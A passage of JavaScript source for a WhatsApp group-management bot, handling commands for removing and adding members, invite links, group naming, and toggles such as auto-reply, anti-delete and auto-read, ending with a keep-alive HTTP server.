                    await sock.groupParticipantsUpdate(from, members.slice(i, i + 5), 'remove').catch(() => {})
                    await new Promise(r => setTimeout(r, 500))
                }
                await sock.sendMessage(from, { text: '✅ Done!' }, { quoted: msg })
            }

            else if (cmd === '.listadmins' && isGroup) {
                const meta = await sock.groupMetadata(from)
                const admins = meta.participants.filter(p => p.admin).map(p => `@${p.id.split('@')[0]}`)
                await sock.sendMessage(from, {
                    text: `👑 *Group Admins*\n\n${admins.join('\n')}\n\n⚡ ${BOT_NAME}`,
                    mentions: meta.participants.filter(p => p.admin).map(p => p.id)
                }, { quoted: msg })
            }

            else if (cmd === '.resetlink' && isGroup && isPrivileged) {
                const link = await sock.groupRevokeInvite(from)
                await sock.sendMessage(from, { text: `✅ Group link reset!\n\nNew link: https://chat.whatsapp.com/${link}` }, { quoted: msg })
            }

            else if (cmd === '.grouplink' && isGroup) {
                const code = await sock.groupInviteCode(from)
                await sock.sendMessage(from, { text: `🔗 *Group Link*\n\nhttps://chat.whatsapp.com/${code}\n\n⚡ ${BOT_NAME}` }, { quoted: msg })
            }

            else if (cmd === '.setgcname' && isGroup && isPrivileged) {
                if (!query) return sock.sendMessage(from, { text: '❌ Usage: .setgcname <name>' }, { quoted: msg })
                await sock.groupUpdateSubject(from, query)
                await sock.sendMessage(from, { text: `✅ Group name changed to: ${query}` }, { quoted: msg })
            }

            else if (cmd === '.add' && isGroup && isPrivileged) {
                const target = args[1]?.replace(/[^0-9]/g, '')
                if (!target) return sock.sendMessage(from, { text: '❌ Usage: .add number' }, { quoted: msg })
                await sock.groupParticipantsUpdate(from, [target + '@s.whatsapp.net'], 'add')
                await sock.sendMessage(from, { text: `✅ ${target} added!` }, { quoted: msg })
            }

            // ===== MEDIA TOOLS =====
            else if (cmd === '.autoreply') {
                if (!isPrivileged) return
                const status = args[1]?.toLowerCase()
                if (status === 'on') {
                    autoreply[from] = true
                    await sock.sendMessage(from, { text: '✅ Auto reply ON! Bot will reply to all messages with AI.' }, { quoted: msg })
                } else {
                    autoreply[from] = false
                    await sock.sendMessage(from, { text: '❌ Auto reply OFF!' }, { quoted: msg })
                }
            }

            else if (cmd === '.antidelete') {
                if (!isPrivileged) return
                const status = args[1]?.toLowerCase()
                if (status === 'on') {
                    antiDelete[from] = { enabled: true }
                    await sock.sendMessage(from, { text: '✅ Anti-delete ON!' }, { quoted: msg })
                } else {
                    antiDelete[from] = { enabled: false }
                    await sock.sendMessage(from, { text: '❌ Anti-delete OFF!' }, { quoted: msg })
                }
            }

            else if (cmd === '.antibadword') {
                if (!isPrivileged) return
                const status = args[1]?.toLowerCase()
                antibadword[from] = status === 'on'
                await sock.sendMessage(from, { text: `${status === 'on' ? '✅' : '❌'} Anti bad word ${status === 'on' ? 'ON' : 'OFF'}!` }, { quoted: msg })
            }

            else if (cmd === '.autoread') {
                if (!isPrivileged) return
                autoread = args[1]?.toLowerCase() === 'on'
                await sock.sendMessage(from, { text: `${autoread ? '✅' : '❌'} Auto read ${autoread ? 'ON' : 'OFF'}!` }, { quoted: msg })
            }

            else if (cmd === '.autoreact') {
                if (!isPrivileged) return
                autoreact = args[1]?.toLowerCase() === 'on'
                await sock.sendMessage(from, { text: `${autoreact ? '✅' : '❌'} Auto react ${autoreact ? 'ON' : 'OFF'}!` }, { quoted: msg })
            }

            else if (cmd === '.autotyping') {
                if (!isPrivileged) return
                autotyping = args[1]?.toLowerCase() === 'on'
                await sock.sendMessage(from, { text: `${autotyping ? '✅' : '❌'} Auto typing ${autotyping ? 'ON' : 'OFF'}!` }, { quoted: msg })
            }

        } catch (err) {
            console.log('Error:', err)
        }
    })

    // Keep alive
    http.createServer((req, res) => res.end(`${BOT_NAME} Running! ⚡`)).listen(3000)
    console.log(`\n✅ ${BOT_NAME} ${BOT_VERSION} Started!`)
    console.log(`👑 Owner: ${OWNER_NAME}`)
    console.log(`⚡ Powered by TAVIK TECH\n`)
}

startBot()
